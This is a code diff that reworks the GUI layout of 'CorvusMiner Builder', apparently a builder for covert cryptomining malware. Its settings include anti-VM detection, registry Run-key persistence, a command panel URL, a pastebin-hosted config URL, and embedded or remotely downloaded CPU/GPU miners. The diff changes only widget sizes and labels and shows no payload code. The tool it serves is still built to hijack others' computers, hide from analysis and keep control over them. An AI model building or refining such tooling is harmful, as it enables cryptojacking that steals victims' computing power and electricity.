@@ -356,12 +356,12 @@ def get_optimal_window_size():
 def create_window(profiles):
     """Create the main GUI window."""
     
-    # Left column with all settings
+    # Left column with all settings - wrapped in a scrollable container
     left_column = [
         # Title and status
         [sg.Text("CorvusMiner Builder", font=('Segoe UI', 20, 'bold'), text_color='#0066CC')],
         [sg.Text("Professional Build Configuration", font=('Segoe UI', 11, 'italic'), text_color='#888888')],
-        [sg.Text('_' * 65, text_color='#444444')],
+        [sg.Text('_' * 50, text_color='#444444')],
         
         # Profile Management
         [
@@ -370,14 +370,14 @@ def create_window(profiles):
                     sg.Combo(
                         values=profiles.list_profiles(),
                         key='-PROFILE_SELECTOR-',
-                        size=(25, 1),
+                        size=(20, 1),
                         readonly=True,
                         background_color='#3c3c3c',
                         text_color='white'
                     ),
-                    sg.Button("Load", key='-LOAD_PROFILE-', size=(8, 1)),
-                    sg.Button("Save As", key='-SAVE_PROFILE-', size=(8, 1)),
-                    sg.Button("Delete", key='-DELETE_PROFILE-', size=(8, 1)),
+                    sg.Button("Load", key='-LOAD_PROFILE-', size=(7, 1)),
+                    sg.Button("Save As", key='-SAVE_PROFILE-', size=(7, 1)),
+                    sg.Button("Delete", key='-DELETE_PROFILE-', size=(7, 1)),
                 ]
             ], background_color='#2b2b2b', title_color='#0066CC', relief=sg.RELIEF_SUNKEN)
         ],
@@ -385,20 +385,18 @@ def create_window(profiles):
         # Build Configuration
         [
             sg.Frame('Connection Settings', [
-                [sg.Text("⚠ WARNING: Use EITHER Panel URL OR Config GET URL, not both!", 
+                [sg.Text("⚠ Use EITHER Panel URL OR Config URL!", 
                          font=('Segoe UI', 9, 'bold'), text_color='#FF6600', background_color='#2b2b2b')],
-                [sg.Text("You can specify multiple URLs separated by commas (,) for fallback support", 
+                [sg.Text("Multiple URLs: comma-separated (,)", 
                          font=('Segoe UI', 9, 'italic'), text_color='#888888', background_color='#2b2b2b')],
                 [sg.Text("")],
-                [sg.Text("Panel URL:", size=(18, 1), font=('Segoe UI', 10, 'bold')), 
-                 sg.InputText(key='-PANEL_URL-', size=(38, 1), background_color='#3c3c3c', text_color='black', selected_background_color='#FFD700', selected_text_color='black')],
-                [sg.Text("Example: https://your-panel.com/api/miners/submit,https://backup-panel.com/api/miners/submit", font=('Segoe UI', 8, 'italic'), text_color='#888888', size=(60, 1))],
-                [sg.Text("Leave blank if using Config GET URL instead", font=('Segoe UI', 8, 'italic'), text_color='#888888', size=(60, 1))],
+                [sg.Text("Panel URL:", size=(16, 1), font=('Segoe UI', 10, 'bold')), 
+                 sg.InputText(key='-PANEL_URL-', size=(32, 1), background_color='#3c3c3c', text_color='black', selected_background_color='#FFD700', selected_text_color='black')],
+                [sg.Text("https://panel.com/api/miners/submit", font=('Segoe UI', 8, 'italic'), text_color='#888888', size=(50, 1))],
                 [sg.Text("")],
-                [sg.Text("Config GET URL:", size=(18, 1), font=('Segoe UI', 10, 'bold')),
-                 sg.InputText(key='-CONFIG_URL-', size=(38, 1), background_color='#3c3c3c', text_color='black', selected_background_color='#FFD700', selected_text_color='black')],
-                [sg.Text("Example: https://pastebin.com/raw/YOUR_ID,https://example.com/backup/config.json", font=('Segoe UI', 8, 'italic'), text_color='#888888', size=(60, 1))],
-                [sg.Text("Leave blank if using Panel URL instead", font=('Segoe UI', 8, 'italic'), text_color='#888888', size=(60, 1))],
+                [sg.Text("Config GET URL:", size=(16, 1), font=('Segoe UI', 10, 'bold')),
+                 sg.InputText(key='-CONFIG_URL-', size=(32, 1), background_color='#3c3c3c', text_color='black', selected_background_color='#FFD700', selected_text_color='black')],
+                [sg.Text("https://pastebin.com/raw/YOUR_ID", font=('Segoe UI', 8, 'italic'), text_color='#888888', size=(50, 1))],
             ], background_color='#2b2b2b', title_color='#0066CC', relief=sg.RELIEF_SUNKEN),
         ],
         
@@ -407,7 +405,7 @@ def create_window(profiles):
             sg.Frame('Core Features', [
                 [
                     sg.Checkbox("Anti-VM Detection", key='-ANTIVM-', default=False, background_color='#2b2b2b', text_color='white'),
-                    sg.Checkbox("Persistence (Run Key)", key='-PERSISTENCE-', default=False, background_color='#2b2b2b', text_color='white'),
+                    sg.Checkbox("Persistence", key='-PERSISTENCE-', default=False, background_color='#2b2b2b', text_color='white'),
                 ],
                 [
                     sg.Checkbox("Debug Console", key='-DEBUG_CONSOLE-', default=False, background_color='#2b2b2b', text_color='white'),
@@ -423,35 +421,43 @@ def create_window(profiles):
         [
             sg.Frame('Miner Configuration', [
                 [
-                    sg.Checkbox("Embed CPU Miner", key='-CPU_MINER-', default=True, background_color='#2b2b2b', text_color='white', disabled=False),
-                    sg.Checkbox("Embed GPU Miner", key='-GPU_MINER-', default=False, background_color='#2b2b2b', text_color='white', disabled=False),
+                    sg.Checkbox("CPU Miner", key='-CPU_MINER-', default=True, background_color='#2b2b2b', text_color='white', disabled=False),
+                    sg.Checkbox("GPU Miner", key='-GPU_MINER-', default=False, background_color='#2b2b2b', text_color='white', disabled=False),
                 ],
                 [
-                    sg.Checkbox("Remote Miners (download from panel)", key='-REMOTE_MINERS-', default=False, background_color='#2b2b2b', text_color='white', disabled=False),
+                    sg.Checkbox("Remote Miners", key='-REMOTE_MINERS-', default=False, background_color='#2b2b2b', text_color='white', disabled=False),
                 ],
-                [sg.Text("ℹ Panel mode disables embedded miners (all download from panel)", 
-                         font=('Segoe UI', 9, 'italic'), text_color='#888888', key='-MINER_INFO-')],
+                [sg.Text("ℹ Panel: download from panel", 
+                         font=('Segoe UI', 8, 'italic'), text_color='#888888', key='-MINER_INFO-')],
             ], background_color='#2b2b2b', title_color='#0066CC', relief=sg.RELIEF_SUNKEN),
         ],
         
         # BUILD BUTTON
-        [sg.Text('_' * 65, text_color='#444444')],
-        [sg.Button("BUILD NOW", key='-BUILD-', size=(20, 1), button_color=('white', '#00AA00'), font=('Segoe UI', 12, 'bold')), sg.Button("Clear Output", key='-CLEAR-', size=(15, 1)), sg.Button("Open Build Folder", key='-OPEN_FOLDER-', size=(18, 1)), sg.Button("Info", key='-INFO-', size=(10, 1))],
-        [sg.Text('_' * 65, text_color='#444444')],
+        [sg.Text('_' * 50, text_color='#444444')],
+        [sg.Button("BUILD NOW", key='-BUILD-', size=(16, 2), button_color=('white', '#00AA00'), font=('Segoe UI', 11, 'bold')), 
+         sg.Button("Clear", key='-CLEAR-', size=(10, 2)), 
+         sg.Button("Folder", key='-OPEN_FOLDER-', size=(10, 2))],
+        [sg.Button("Info", key='-INFO-', size=(10, 1))],
+        [sg.Text('_' * 50, text_color='#444444')],
         
         # Status
         [
-            sg.Stretch(),
-            sg.Text("Status: ", font=('Segoe UI', 10, 'bold'), text_color='black'),
-            sg.Text("Ready", key='-STATUS-', text_color='black', font=('Segoe UI', 10, 'bold')),
+            sg.Text("Status: ", font=('Segoe UI', 10, 'bold'), text_color='white'),
+            sg.Text("Ready", key='-STATUS-', text_color='#00AA00', font=('Segoe UI', 10, 'bold')),
         ]
     ]
     
-    # Right column with Build Output
+    # Wrap left column in a scrollable container
+    scrollable_left = [
+        [sg.Column(left_column, scrollable=True, vertical_scroll_only=True, 
+                   size=(500, 750), background_color='#2b2b2b')]
+    ]
+    
+    # Right column with Build Output - responsive width
     right_column = [
         [sg.Text('Build Output', font=('Segoe UI', 11, 'bold'), text_color='#0066CC')],
         [sg.Multiline(
-            size=(60, 50),
+            size=(45, 50),
             key='-OUTPUT-',
             disabled=True,
             autoscroll=True,
@@ -463,8 +469,8 @@ def create_window(profiles):
     
     layout = [
         [
-            sg.Column(left_column, background_color='#2b2b2b'),
-            sg.Column(right_column, background_color='#2b2b2b')
+            sg.Column(scrollable_left, background_color='#2b2b2b', vertical_alignment='top'),
+            sg.Column(right_column, background_color='#2b2b2b', vertical_alignment='top')
         ]
     ]
     
